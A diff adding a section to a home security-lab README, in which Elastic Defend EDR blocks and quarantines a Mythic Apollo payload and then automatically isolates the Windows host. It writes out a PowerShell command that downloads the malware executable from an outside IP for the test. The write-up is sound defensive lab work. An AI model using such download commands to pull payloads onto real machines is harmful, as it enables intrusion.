@@ -1329,6 +1329,84 @@ I could see the processes involved, the file being created and the network conne
 Adding more network telemetry would therefore be a useful improvement to the lab in the future.
 
 
+## Elastic Defend EDR
+
+Before finishing the lab, I decided to set up **Elastic Defend EDR**. Since I already had Fleet and the Elastic Agent running on the Windows machine, I added the Elastic Defend integration to my existing `MyDFIR-Windows-Policy` and selected **Complete EDR**.
+
+Once applied, `MyDFIR-WIN` appeared under Endpoints.
+
+<img width="2252" height="400" alt="image" src="https://github.com/user-attachments/assets/4ba60580-a88e-4077-838f-d7528c741a77" />
+
+### Testing Malware Prevention
+
+I tested it using the same Mythic Apollo payload from earlier in the lab:
+
+```text
+C:\Users\Public\Downloads\mydfir.exe
+```
+
+When I tried to run the payload, Elastic Defend immediately blocked it and displayed a malware notification on the Windows machine.
+
+<img width="794" height="571" alt="image" src="https://github.com/user-attachments/assets/20ec60b9-9d3e-4ca4-bc99-9b7cf8cc57c8" />
+
+Elastic also generated a **Malware Prevention Alert**, showing useful information including:
+
+```text
+Host: mydfir-win
+User: Administrator
+Process: C:\Users\Public\Downloads\mydfir.exe
+File: mydfir.exe
+```
+
+<img width="2234" height="1172" alt="image" src="https://github.com/user-attachments/assets/282fde2a-0571-4230-9472-f599a4fec245" />
+
+
+The file was also quarantined.
+
+This was a nice step up from the Sysmon rules I'd been using earlier. Rather than just detecting suspicious activity so I could investigate it afterwards, Elastic Defend was actually able to prevent the malware from running.
+
+### Testing Host Isolation
+
+I also wanted to test one of the EDR response actions, so I configured the alert to **isolate the host**.
+
+To make the isolation obvious, I started a continuous ping on the Windows machine:
+
+```cmd
+ping 8.8.8.8 -t
+```
+
+I then attempted to download the malware again using PowerShell:
+
+```powershell
+Invoke-WebRequest -Uri http://78.141.196.90:9999/mydfir.exe -OutFile "C:\Users\Public\Downloads\mydfir.exe"
+```
+<img width="1920" height="927" alt="image" src="https://github.com/user-attachments/assets/f080cf00-530c-41a8-8878-2a32e538c9b2" />
+
+Elastic Defend blocked the malware and generated the alert. About a minute later, the host was automatically isolated.
+
+<img width="1935" height="1107" alt="image" src="https://github.com/user-attachments/assets/23e63a95-73cf-4233-833d-d30b4c2ae1da" />
+
+I could see this happening in real time as the successful pings changed to:
+
+```text
+General failure.
+General failure.
+General failure.
+```
+
+The Windows machine also received an **Elastic Security - Host Isolated** notification.
+
+So by the end of the lab I had gone from simply collecting and searching logs to having an EDR capable of actively preventing malware and automatically isolating a compromised endpoint:
+
+```text
+Malware detected → Execution blocked → Alert generated → Host isolated
+```
+
+This was a good final addition to the lab and also gave me a chance to make use of the Fleet server I'd already set up.
+
+
+
+
 
 
 
